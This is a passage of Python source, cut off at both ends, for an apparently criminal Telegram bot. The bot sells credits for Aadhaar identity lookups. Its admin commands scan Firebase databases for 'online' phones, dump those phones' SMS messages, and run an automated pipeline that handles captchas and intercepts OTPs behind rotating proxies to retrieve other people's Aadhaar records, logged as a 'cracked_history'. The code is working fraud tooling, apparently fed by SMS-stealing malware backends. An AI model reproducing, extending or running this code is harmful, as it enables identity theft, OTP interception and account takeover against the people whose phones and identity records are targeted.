            print(f"⚠️ [ADMIN] Error: {e}")


@bot.callback_query_handler(func=lambda call: call.data.startswith('mp|'))
def handle_manual_pref_selection(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id)
    except: pass
    parts = call.data.split('|')
    action = parts[1]
    state = user_states.get(chat_id, {})
    number = state.get('num', '')
    if action == 'manual':
        user_states[chat_id] = {'step': 'AWAITING_NAME', 'num': number, 'prefix': ''}
        msg_text = get_ui_card(
            step_num="2",
            title="Aadhaar Holder Name",
            description="Send me the <b>Aadhaar Holder Name</b> exactly as printed on the card.",
            target=number
        )
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=msg_text, parse_mode='HTML')
        except:
            bot.send_message(chat_id, msg_text, parse_mode='HTML')
    else:
        name = "Mr" if action == "Mr." else "Mrs"
        dob = None
        status_msg = get_ui_card(
            step_num="3",
            title="EID Retrieval",
            description=f"⏳ <b>Initializing target {number}...</b>\n\nPlease wait..."
        )
        try:
            bot.edit_message_text(chat_id=chat_id, message_id=call.message.message_id, text=status_msg, parse_mode='HTML')
        except:
            bot.send_message(chat_id, status_msg, parse_mode='HTML')
        user_states[chat_id] = {'step': 'PROCESSING'}
        user_info = {
            'username': call.from_user.username or 'N/A',
            'first_name': call.from_user.first_name or 'N/A'
        }
        asyncio.run_coroutine_threadsafe(execute_and_reset(chat_id, name, number, dob, user_info=user_info), loop)


@bot.callback_query_handler(func=lambda call: call.data == 'refresh_zero_credits')
def handle_refresh_zero_credits(call):
    chat_id = call.message.chat.id
    try:
        bot.answer_callback_query(call.id, text="Checking credits...", show_alert=False)
    except: pass
    is_admin = chat_id in ADMIN_IDS
    mode = stats_manager.get_bot_mode()
    if is_admin or mode == "free":
        send_welcome_dashboard(chat_id, message_id=call.message.message_id)
        return
    credits = stats_manager.get_user_credits(chat_id)
    if credits > 0:
        try:
            bot.send_message(chat_id, f"🎉 <b>Credits Received!</b> {credits} credits aa gaye.", parse_mode='HTML')
        except: pass
        send_welcome_dashboard(chat_id, message_id=call.message.message_id)
    else:
        send_zero_credits_dashboard(chat_id, message_id=call.message.message_id)
        try:
            bot.answer_callback_query(call.id, text="Still 0 credits.", show_alert=True)
        except: pass


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    chat_id = call.message.chat.id
    print(f"📥 [CALLBACK] {call.data} for {chat_id}")
    try:
        bot.answer_callback_query(call.id)
    except Exception as e:
        print(f"⚠️ [CALLBACK] Failed: {e}")
    if call.data == "check_joined_status":
        if check_user_joined(chat_id):
            try:
                bot.delete_message(chat_id=chat_id, message_id=call.message.message_id)
            except: pass
            send_welcome_dashboard(chat_id)
        else:
            try:
                bot.answer_callback_query(call.id, text="⚠️ Saare channels join nahi kiye!", show_alert=True)
            except: pass


@bot.message_handler(commands=['profile'])
def handle_profile(message):
    chat_id = message.chat.id
    if not check_user_joined(chat_id):
        prompt_join_channels(chat_id)
        return
    try:
        str_chat_id = int(chat_id)
    except:
        str_chat_id = chat_id
    data = stats_manager.load_stats()
    user_record = None
    for u in data.get("users", []):
        if isinstance(u, dict) and u.get("chat_id") == str_chat_id:
            user_record = u
            break
    if not user_record:
        try:
            stats_manager.register_visit(chat_id, username=message.from_user.username, first_name=message.from_user.first_name)
            data = stats_manager.load_stats()
            for u in data.get("users", []):
                if isinstance(u, dict) and u.get("chat_id") == str_chat_id:
                    user_record = u
                    break
        except: pass
    join_date = user_record.get("joined", "N/A") if user_record else "N/A"
    credits = stats_manager.get_user_credits(chat_id)
    mode = stats_manager.get_bot_mode()
    history = data.get("cracked_history", [])
    success_count = sum(1 for r in history if r.get("chat_id") == str_chat_id)
    credits_str = "Unlimited 💳" if mode == "free" else f"{credits} 💳"
    profile_text = (
        "👤 <b>USER PROFILE DASHBOARD</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"  ├─ <b>First Name:</b> {message.from_user.first_name}\n"
        f"  ├─ <b>Username:</b> @{message.from_user.username or 'N/A'}\n"
        f"  ├─ <b>Telegram ID:</b> <code>{chat_id}</code>\n"
        f"  ├─ <b>Joined Date:</b> <code>{join_date}</code>\n"
        f"  ├─ <b>Credit Balance:</b> <b>{credits_str}</b>\n"
        f"  └─ <b>Success Checked:</b> <code>{success_count} ✅</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(chat_id, profile_text, parse_mode='HTML')


@bot.message_handler(commands=['refer'])
def handle_refer(message):
    chat_id = message.chat.id
    if not check_user_joined(chat_id):
        prompt_join_channels(chat_id)
        return
    try:
        bot_username = bot.get_me().username
    except Exception as e:
        print(f"⚠️ Failed to get bot username: {e}")
        bot_username = "bot"
    referral_link = f"https://t.me/{bot_username}?start=ref_{chat_id}"
    data = stats_manager.load_stats()
    referred_count = 0
    for u in data.get("users", []):
        if isinstance(u, dict) and u.get("referred_by") == chat_id:
            referred_count += 1
    refer_text = (
        "🤝 <b>REFERRAL & INVITE SYSTEM</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "Apne dosto ko invite karein aur har successful join par <b>1 Credit</b> payein!\n\n"
        f"🔗 <b>Your Invite Link:</b>\n<code>{referral_link}</code>\n\n"
        f"👥 <b>Total Referrals:</b> <code>{referred_count} joined</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(chat_id, refer_text, parse_mode='HTML')


@bot.message_handler(commands=['admin'])
def handle_admin(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ <b>Access Denied!</b>", parse_mode='HTML')
        return
    send_admin_dashboard(chat_id)


def perform_broadcast(message):
    admin_chat_id = message.chat.id
    data = stats_manager.load_stats()
    users = data.get("users", [])
    success = 0
    failed = 0
    total = len(users)
    if total == 0:
        bot.send_message(admin_chat_id, "⚠️ No users found.")
        return
    start_time = time.time()
    for u in users:
        if isinstance(u, dict):
            user_id = u.get("chat_id")
        else:
            user_id = u
        if not user_id:
            continue
        try:
            bot.copy_message(chat_id=user_id, from_chat_id=admin_chat_id, message_id=message.message_id)
            success += 1
            time.sleep(0.05)
        except Exception as e:
            print(f"⚠️ [BROADCAST] Failed to {user_id}: {e}")
            failed += 1
    elapsed = int(time.time() - start_time)
    report = (
        "📢 <b>Broadcast Completed!</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"📊 <b>Total:</b> <code>{total}</code>\n"
        f"✅ <b>Sent:</b> <code>{success}</code>\n"
        f"❌ <b>Failed:</b> <code>{failed}</code>\n"
        f"⏱ <b>Time:</b> <code>{elapsed} sec</code>"
    )
    bot.send_message(admin_chat_id, report, parse_mode='HTML')


# ==============================================================================
# 🔥 FIREBASE COMMANDS
# ==============================================================================

@bot.message_handler(commands=['addfire'])
def cmd_addfire(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(
            chat_id,
            "ℹ️ <b>Usage:</b>\n"
            "<code>/addfire https://db1.firebaseio.com/</code>\n"
            "or multiple URLs separated by space/newline/comma.",
            parse_mode='HTML'
        )
        return
    raw = parts[1].strip()
    candidates = re.split(r'[\s,;]+', raw)
    candidates = [c.strip() for c in candidates if c.strip()]
    if not candidates:
        bot.send_message(chat_id, "❌ No valid URLs found.")
        return
    added, skipped, failed = [], [], []
    for cand in candidates:
        try:
            ok, msg = aadhaar_engine.firebase_add_link(cand, added_by=chat_id)
            if ok:
                added.append(cand)
            else:
                if "already exists" in msg.lower():
                    skipped.append(cand)
                else:
                    failed.append((cand, msg))
        except Exception as e:
            failed.append((cand, str(e)))
    lines = []
    if added:
        lines.append(f"✅ <b>Added {len(added)} link(s):</b>")
        for u in added:
            short = u.replace("https://", "").replace("http://", "").rstrip("/")
            lines.append(f"  • <code>{short}</code>")
    if skipped:
        lines.append(f"\n⚠️ <b>Skipped {len(skipped)} (already present):</b>")
        for u in skipped:
            short = u.replace("https://", "").replace("http://", "").rstrip("/")
            lines.append(f"  • <code>{short}</code>")
    if failed:
        lines.append(f"\n❌ <b>Failed {len(failed)}:</b>")
        for u, err in failed:
            short = u.replace("https://", "").replace("http://", "").rstrip("/")
            lines.append(f"  • <code>{short}</code> — {aadhaar_engine.escape_html(err)}")
    if not lines:
        lines.append("ℹ️ Nothing changed.")
    bot.send_message(chat_id, "\n".join(lines), parse_mode='HTML')


@bot.message_handler(commands=['removefire'])
def cmd_removefire(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.send_message(chat_id, "ℹ️ <b>Usage:</b> <code>/removefire URL</code> or <code>/removefire all</code>", parse_mode='HTML')
        return
    count, msg = aadhaar_engine.firebase_remove_link(parts[1].strip())
    bot.send_message(chat_id, msg, parse_mode='HTML')


@bot.message_handler(commands=['listfire'])
def cmd_listfire(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    bot.send_message(chat_id, aadhaar_engine.firebase_list_text(), parse_mode='HTML')


# ==============================================================================
# 🚀 AUTO PIPELINE — THE MAIN ONE-CLICK COMMAND
# ==============================================================================

@bot.message_handler(commands=['auto'])
def cmd_auto(message):
    """
    /auto [N] — Full automated pipeline.
    Scans ALL Firebase links, detects every online phone, processes up to N (or all)
    in parallel (5 concurrent), with automatic captcha + OTP handling + 3 retries.
    """
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return

    links = aadhaar_engine._load_firebase_links()
    if not links:
        bot.send_message(chat_id, "📭 No Firebase links configured. Use <code>/addfire URL</code> first.", parse_mode='HTML')
        return

    # Parse optional count
    parts = message.text.split(maxsplit=1)
    max_phones = None  # None = process ALL detected phones
    if len(parts) > 1 and parts[1].strip().isdigit():
        max_phones = int(parts[1].strip())
        if max_phones <= 0:
            max_phones = None

    # Enable global auto-otp state (allows /stopauto to work too)
    aadhaar_engine.auto_otp_state["enabled"] = True
    aadhaar_engine.auto_otp_state["chat_id"] = chat_id

    # Launch the pipeline on the global loop
    launched = aadhaar_engine.start_auto_batch(bot, chat_id, max_phones)
    if not launched:
        bot.send_message(chat_id,
            "❌ Could not launch auto pipeline (event loop not ready). Try again in a moment.",
            parse_mode='HTML')


@bot.message_handler(commands=['runall', 'batch'])
def cmd_runall(message):
    """Alias of /auto — kept for compatibility."""
    cmd_auto(message)


@bot.message_handler(commands=['stopauto'])
def cmd_stopauto(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    was = aadhaar_engine.auto_otp_state.get("enabled", False)
    aadhaar_engine.auto_otp_state["enabled"] = False
    aadhaar_engine.auto_otp_state["chat_id"] = None
    aadhaar_engine.auto_otp_state["target_mobile"] = None
    bot.send_message(
        chat_id,
        "🛑 <b>Auto-OTP state disabled.</b>\nNote: any running /auto batch will finish its current phones." if was else "ℹ️ Auto-OTP was already off.",
        parse_mode='HTML'
    )


@bot.message_handler(commands=['resetused'])
def cmd_resetused(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    count = len(aadhaar_engine.auto_otp_state["used_otps"])
    aadhaar_engine.auto_otp_state["used_otps"].clear()
    bot.send_message(
        chat_id,
        f"🔄 <b>Reset complete.</b>\nCleared <code>{count}</code> cached OTP reference(s).",
        parse_mode='HTML'
    )


# ==============================================================================
# 📱 SCAN — Preview all online phones
# ==============================================================================

@bot.message_handler(commands=['scan'])
def cmd_scan(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    links = aadhaar_engine._load_firebase_links()
    if not links:
        bot.send_message(chat_id, "📭 No Firebase links configured. Use <code>/addfire URL</code> first.", parse_mode='HTML')
        return
    status = bot.send_message(chat_id, "🔍 <b>Scanning Firebase links...</b>", parse_mode='HTML')

    async def run_scan():
        async with aiohttp.ClientSession() as session:
            lines = ["🔥 <b>FIREBASE SCAN REPORT</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
            total_phones = 0
            for entry in links:
                url = entry.get("url", "")
                short = url.replace("https://", "").replace("http://", "").rstrip("/")
                try:
                    mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=None)
                    if mapping:
                        total_phones += len(mapping)
                        lines.append(f"🔗 <code>{short}</code>")
                        lines.append(f"   📱 <b>{len(mapping)}</b> phone(s) online")
                        for ph in list(mapping.keys())[:10]:
                            lines.append(f"      ├ <code>{ph}</code>")
                        if len(mapping) > 10:
                            lines.append(f"      └ … +{len(mapping)-10} more")
                    else:
                        lines.append(f"🔗 <code>{short}</code>\n   ⚠️ No phones found")
                except Exception as e:
                    lines.append(f"🔗 <code>{short}</code>\n   ❌ {e}")
            lines.append("━━━━━━━━━━━━━━━━━━━━━━")
            lines.append(f"📊 <b>Total phones online:</b> {total_phones}")
            lines.append(f"\n<i>Use /auto to process them →</i>")
            report = "\n".join(lines)
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=report, parse_mode='HTML')
            except:
                bot.send_message(chat_id, report, parse_mode='HTML')

    try:
        asyncio.run_coroutine_threadsafe(run_scan(), loop)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Scan error: {e}")


# ==============================================================================
# 🔬 DEBUG COMMANDS
# ==============================================================================

@bot.message_handler(commands=['debugscan'])
def cmd_debugscan(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    links = aadhaar_engine._load_firebase_links()
    if not links:
        bot.send_message(chat_id, "📭 No Firebase links configured.", parse_mode='HTML')
        return
    status = bot.send_message(chat_id, "🔬 <b>Deep-scanning Firebase...</b>", parse_mode='HTML')

    async def run_debug():
        async with aiohttp.ClientSession() as session:
            chunks = []
            for entry in links:
                url = entry.get("url", "")
                short = url.replace("https://", "").replace("http://", "").rstrip("/")
                lines = [f"🔍 <b>Debug:</b> <code>{short}</code>"]
                try:
                    async with session.get(f"{url}clients.json?shallow=true",
                                           timeout=aiohttp.ClientTimeout(total=8)) as r:
                        if r.status != 200:
                            lines.append(f"❌ clients.json HTTP {r.status}")
                            chunks.append("\n".join(lines))
                            continue
                        shallow = await r.json() or {}
                    lines.append(f"👥 Total clients: <b>{len(shallow)}</b>")

                    async with session.get(f"{url}clients.json",
                                           timeout=aiohttp.ClientTimeout(total=8)) as r:
                        full = await r.json() or {}
                    online = [c for c, d in full.items()
                              if isinstance(d, dict) and d.get("status") is True]
                    lines.append(f"🟢 Online devices: <b>{len(online)}</b>")

                    with_phones = 0
                    sample = []
                    for cid in online[:10]:
                        msgs = await aadhaar_engine.firebase_get_device_messages(session, url, cid, limit=5)
                        phone = aadhaar_engine.firebase_extract_phone(msgs) if msgs else None
                        if phone:
                            with_phones += 1
                            if len(sample) < 3:
                                sample.append(f"  ├ <code>{phone}</code> → <code>{cid[:10]}…</code>")
                    lines.append(f"📱 Devices with phones: <b>{with_phones}</b> (of first 10)")
                    if sample:
                        lines.append("\n".join(sample))
                except Exception as e:
                    lines.append(f"❌ Error: {e}")
                chunks.append("\n".join(lines))
            final = "\n\n━━━━━━━━━━━━━━━━━━━━━━\n\n".join(chunks)
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=final, parse_mode='HTML')
            except:
                bot.send_message(chat_id, final, parse_mode='HTML')

    try:
        asyncio.run_coroutine_threadsafe(run_debug(), loop)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Debug error: {e}")


@bot.message_handler(commands=['debugusers'])
def cmd_debugusers(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    links = aadhaar_engine._load_firebase_links()
    if not links:
        bot.send_message(chat_id, "📭 No Firebase links configured.", parse_mode='HTML')
        return
    status = bot.send_message(chat_id, "👥 <b>Fetching Firebase users...</b>", parse_mode='HTML')

    async def run_debug_users():
        async with aiohttp.ClientSession() as session:
            lines = ["👥 <b>FIREBASE USER LIST</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
            total = 0
            for entry in links:
                url = entry.get("url", "")
                short = url.replace("https://", "").replace("http://", "").rstrip("/")
                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=None)
                total += len(mapping)
                lines.append(f"\n🔗 <code>{short}</code> ({len(mapping)} phones)")
                for phone in list(mapping.keys())[:20]:
                    lines.append(f"  ├ <code>{phone}</code>")
            lines.append(f"\n━━━━━━━━━━━━━━━━━━━━━━\n📊 <b>Total phones:</b> {total}")
            final = "\n".join(lines)
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=final, parse_mode='HTML')
            except:
                bot.send_message(chat_id, final, parse_mode='HTML')

    try:
        asyncio.run_coroutine_threadsafe(run_debug_users(), loop)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Debug error: {e}")


@bot.message_handler(commands=['debugmsgs'])
def cmd_debugmsgs(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    parts = message.text.split(maxsplit=1)
    target_phone = parts[1].strip() if len(parts) > 1 and parts[1].strip().isdigit() else None
    links = aadhaar_engine._load_firebase_links()
    if not links:
        bot.send_message(chat_id, "📭 No Firebase links configured.", parse_mode='HTML')
        return
    status = bot.send_message(chat_id, f"📩 <b>Fetching messages{' for '+target_phone if target_phone else ''}...</b>", parse_mode='HTML')

    async def run_debug_msgs():
        async with aiohttp.ClientSession() as session:
            lines = [f"📩 <b>MESSAGE DUMP</b>{' — '+target_phone if target_phone else ''}\n━━━━━━━━━━━━━━━━━━━━━━"]
            for entry in links:
                url = entry.get("url", "")
                short = url.replace("https://", "").replace("http://", "").rstrip("/")
                mapping = await aadhaar_engine.firebase_find_phone_map(session, url, limit_devices=None)
                if not mapping:
                    lines.append(f"\n🔗 <code>{short}</code> — no devices")
                    continue
                lines.append(f"\n🔗 <code>{short}</code>")
                for phone, cid in list(mapping.items())[:5]:
                    if target_phone and phone != target_phone:
                        continue
                    lines.append(f"\n  📱 <b>{phone}</b>")
                    msgs = await aadhaar_engine.firebase_get_device_messages(session, url, cid, limit=5)
                    if not msgs:
                        lines.append("     (no messages)")
                        continue
                    for _, val in list(msgs.items())[-5:]:
                        if isinstance(val, dict):
                            body = val.get("body") or val.get("message") or str(val)
                        else:
                            body = str(val)
                        body = body[:80].replace("\n", " ")
                        lines.append(f"     <code>• {esc(body)}</code>")
                if target_phone:
                    break
            lines.append("\n━━━━━━━━━━━━━━━━━━━━━━")
            final = "\n".join(lines)
            try:
                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=final, parse_mode='HTML')
            except:
                bot.send_message(chat_id, final, parse_mode='HTML')

    try:
        asyncio.run_coroutine_threadsafe(run_debug_msgs(), loop)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Debug error: {e}")


# ==============================================================================
# 🌐 PROXY COMMANDS
# ==============================================================================

@bot.message_handler(commands=['reloadproxy'])
def cmd_reloadproxy(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    try:
        import proxy_loader
        proxies = proxy_loader.load_proxies(force=True)
        bot.send_message(chat_id, f"🔄 <b>Proxy pool reloaded.</b>\n📊 Loaded: <code>{len(proxies)}</code> proxy(s)", parse_mode='HTML')
    except Exception as e:
        bot.send_message(chat_id, f"❌ Reload failed: {e}")


@bot.message_handler(commands=['proxystatus'])
def cmd_proxystatus(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    try:
        import proxy_loader
        proxies = proxy_loader.load_proxies()
        status_icon = "🟢 <b>Active</b>" if proxies else "🔴 <b>Empty</b>"
        text = (
            "🌐 <b>PROXY STATUS</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 Pool size: <code>{len(proxies)}</code>\n"
            f"📁 File: <code>proxies.txt</code>\n"
            f"⚡ Status: {status_icon}\n"
        )
        if proxies:
            for p in proxies[:5]:
                masked = p.split("@")[-1] if "@" in p else p
                text += f"  ├ <code>{masked}</code>\n"
            if len(proxies) > 5:
                text += f"  └ … +{len(proxies)-5} more\n"
        text += "━━━━━━━━━━━━━━━━━━━━━━"
        bot.send_message(chat_id, text, parse_mode='HTML')
    except Exception as e:
        bot.send_message(chat_id, f"❌ Proxy status failed: {e}")


@bot.message_handler(commands=['testproxy'])
def cmd_testproxy(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    status = bot.send_message(chat_id, "🌐 <b>Testing proxies...</b>", parse_mode='HTML')

    async def run_test():
        try:
            import proxy_loader
            proxies = proxy_loader.load_proxies(force=True)
            if not proxies:
                bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text="❌ No proxies loaded.", parse_mode='HTML')
                return
            async with aiohttp.ClientSession() as session:
                working = 0
                tested = 0
                lines = ["🌐 <b>PROXY TEST RESULTS</b>\n━━━━━━━━━━━━━━━━━━━━━━"]
                for p in proxies[:5]:
                    tested += 1
                    masked = p.split("@")[-1] if "@" in p else p
                    try:
                        async with session.get(
                            "https://api.ipify.org?format=json",
                            proxy=p,
                            timeout=aiohttp.ClientTimeout(total=10)
                        ) as r:
                            if r.status == 200:
                                data = await r.json()
                                ip = data.get("ip", "?")
                                lines.append(f"✅ <code>{masked}</code> → <code>{ip}</code>")
                                working += 1
                            else:
                                lines.append(f"❌ <code>{masked}</code> HTTP {r.status}")
                    except Exception as e:
                        err = str(e)[:40]
                        lines.append(f"❌ <code>{masked}</code> — {esc(err)}")
                lines.append("━━━━━━━━━━━━━━━━━━━━━━")
                lines.append(f"📊 <b>Working:</b> {working}/{tested}")
                final = "\n".join(lines)
                try:
                    bot.edit_message_text(chat_id=chat_id, message_id=status.message_id, text=final, parse_mode='HTML')
                except:
                    bot.send_message(chat_id, final, parse_mode='HTML')
        except Exception as e:
            bot.send_message(chat_id, f"❌ Test error: {e}")

    try:
        asyncio.run_coroutine_threadsafe(run_test(), loop)
    except Exception as e:
        bot.send_message(chat_id, f"❌ Test error: {e}")


# ==============================================================================
# ⚙️ STATUS & HELP
# ==============================================================================

@bot.message_handler(commands=['status'])
def cmd_status(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    links = aadhaar_engine._load_firebase_links()
    auto_on = aadhaar_engine.auto_otp_state.get("enabled", False)
    try:
        import proxy_loader
        proxies = proxy_loader.load_proxies()
        proxy_count = len(proxies)
    except Exception:
        proxy_count = 0
    active_now = len(aadhaar_engine.active_tasks)
    status_text = (
        "⚙️ <b>SYSTEM STATUS</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🔥 <b>Firebase:</b>\n"
        f"  ├─ Links: <code>{len(links)}</code>\n"
        f"  └─ Auto-OTP: {'🟢 ON' if auto_on else '🔴 OFF'}\n\n"
        "🌐 <b>Proxies:</b>\n"
        f"  └─ Pool: <code>{proxy_count}</code>\n\n"
        "📊 <b>Live:</b>\n"
        f"  ├─ Active tasks: <code>{active_now}</code>\n"
        f"  ├─ Bot mode: <b>{stats_manager.get_bot_mode().upper()}</b>\n"
        f"  ├─ Cooldown: <code>{stats_manager.get_cooldown_seconds()}s</code>\n"
        f"  └─ Max concurrent: <code>{stats_manager.get_max_concurrent_tasks()}</code>\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    )
    bot.send_message(chat_id, status_text, parse_mode='HTML')


@bot.message_handler(commands=['help'])
def cmd_help(message):
    chat_id = message.chat.id
    if chat_id not in ADMIN_IDS:
        bot.send_message(chat_id, "❌ Admin only command.")
        return
    help_text = (
        "📖 <b>BOT COMMAND REFERENCE</b>\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🚀 <b>MAIN — Auto Pipeline:</b>\n"
        "  /auto            — Scan ALL online phones & run full pipeline\n"
        "  /auto 5          — Same, but only process first 5 phones\n"
        "  /stopauto        — Disable auto-OTP state\n"
        "  /resetused       — Clear cached used-OTP registry\n\n"
        "🔥 <b>Firebase:</b>\n"
        "  /addfire URL       — Add 1 or more Firebase links\n"
        "  /removefire URL    — Remove specific link\n"
        "  /removefire all    — Remove all links\n"
        "  /listfire          — List all configured links\n\n"
        "📱 <b>Preview & Scan:</b>\n"
        "  /scan              — Scan Firebase for ALL online devices\n\n"
        "🔬 <b>Debug:</b>\n"
        "  /debugscan         — Deep-scan Firebase endpoints\n"
        "  /debugusers        — List ALL phones found\n"
        "  /debugmsgs [PHONE] — Dump latest SMS messages\n\n"
        "🌐 <b>Proxy:</b>\n"
        "  /reloadproxy /proxystatus /testproxy\n\n"
        "⚙️ <b>General:</b>\n"
        "  /status /help /admin"
    )
    bot.send_message(chat_id, help_text, parse_mode='HTML')


@bot.message_handler(content_types=['text', 'photo', 'audio', 'video', 'document', 'sticker', 'voice', 'location', 'contact', 'video_note', 'animation'])
def handle_all(message):
    chat_id = message.chat.id
    try:
        stats_manager.register_visit(chat_id)
    except Exception as e:
        print(f"⚠️ [STATS] Failed to register visit: {e}")
    if message.text and message.text.strip().startswith('/start'):
        pass
    elif not check_user_joined(chat_id):
        prompt_join_channels(chat_id)
        return
    state = user_states.get(chat_id, {})
    str_chat_id = str(chat_id)
    if state.get('step') == 'AWAITING_BROADCAST_MSG':
        text_val = message.text.strip() if message.text else ""
        if text_val.lower() == 'cancel':
            user_states[chat_id] = {'step': 'IDLE'}
            bot.send_message(chat_id, "❌ Broadcast cancelled.", reply_markup=types.ReplyKeyboardRemove())
            send_admin_dashboard(chat_id)
            return
        user_states[chat_id] = {'step': 'IDLE'}
        bot.send_message(chat_id, "🚀 <b>Broadcast started in background...</b>", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
        threading.Thread(target=perform_broadcast, args=(message,), daemon=True).start()
        return
    if not message.text:
        return
    text = message.text.strip()
    if state.get('step') == 'AWAITING_ADMIN_COOLDOWN':
        if text.lower() == 'cancel':
            user_states[chat_id] = {'step': 'IDLE'}
            bot.send_message(chat_id, "❌ Cancelled.", reply_markup=types.ReplyKeyboardRemove())
            send_admin_dashboard(chat_id)
            return
        if not text.isdigit():
            bot.send_message(chat_id, "⚠️ Invalid number.")
            return
        val = int(text)
        stats_manager.set_cooldown_seconds(val)
        user_states[chat_id] = {'step': 'IDLE'}
        bot.send_message(chat_id, f"✅ Cooldown set to <b>{val}s</b>", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
        send_admin_dashboard(chat_id)
        return
    if state.get('step') == 'AWAITING_ADMIN_MAX_CONCURRENT':
        if text.lower() == 'cancel':
            user_states[chat_id] = {'step': 'IDLE'}
            bot.send_message(chat_id, "❌ Cancelled.", reply_markup=types.ReplyKeyboardRemove())
            send_admin_dashboard(chat_id)
            return
        if not text.isdigit():
            bot.send_message(chat_id, "⚠️ Invalid number.")
            return
        val = int(text)
        stats_manager.set_max_concurrent_tasks(val)
        user_states[chat_id] = {'step': 'IDLE'}
        bot.send_message(chat_id, f"✅ Max concurrency set to <b>{val}</b>", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
        send_admin_dashboard(chat_id)
        return
    if state.get('step') == 'AWAITING_ADMIN_DEFAULT_CREDITS':
        if text.lower() == 'cancel':
            user_states[chat_id] = {'step': 'IDLE'}
            bot.send_message(chat_id, "❌ Cancelled.", reply_markup=types.ReplyKeyboardRemove())
            send_admin_dashboard(chat_id)
            return
        if not text.isdigit():
            bot.send_message(chat_id, "⚠️ Invalid number.")
            return
        count = int(text)
        stats_manager.set_default_credits(count)
        user_states[chat_id] = {'step': 'IDLE'}
        bot.send_message(chat_id, f"✅ Default credits set to <b>{count}</b>", parse_mode='HTML', reply_markup=types.ReplyKeyboardRemove())
        send_admin_dashboard(chat_id)
        return
    if state.get('step') == 'AWAITING_ADMIN_GRANT_USER_ID':
        if text.lower() == 'cancel':
            user_states[chat_id] = {'step': 'IDLE'}
            bot.send_message(chat_id, "❌ Cancelled.", reply_markup=types.ReplyKeyboardRemove())
            send_admin_dashboard(chat_id)
            return
        if not text.isdigit():
            bot.send_message(chat_id, "⚠️ Invalid User ID.")
            return
        target_id = int(text)
        user_states[chat_id] = {'step': 'AWAITING_ADMIN_GRANT_AMOUNT', 'target_user_id': target_id}
        cancel_markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        cancel_markup.add("Cancel")
        bot.send_message(chat_id, f"➕ <b>Grant Credits to ID:</b> <code>{target_id}</code>\n\n👇 Enter amount (+5 or -2):\n\nType <b>Cancel</b> to abort.", reply_markup=cancel_markup, parse_mode='HTML')
        return
    if state.get('step') == 'AWAITING_ADMIN_GRANT_AMOUNT':
        if text.lower() == 'cancel':
            user_states[chat_id] = {'step': 'IDLE'}
            bot.send_message(chat_id, "❌ Cancelled.", reply_markup=types.ReplyKeyboardRemove())
            send_admin_dashboard(chat_id)
            return
        is_negative = text.startswith('-')
        clean_val = text[1:] if is_negative else text
        if not clean_val.isdigit():
            bot.send_message(chat_id, "⚠️ Invalid amount.")
            return
        amount = int(clean_val)
        if is_negative:
            amount = -amount
        target_id = state.get('target_user_id')
        new_bal = stats_manager.add_user_credits(target_id, amount)
        user_states[chat_id] = {'step': 'IDLE'}
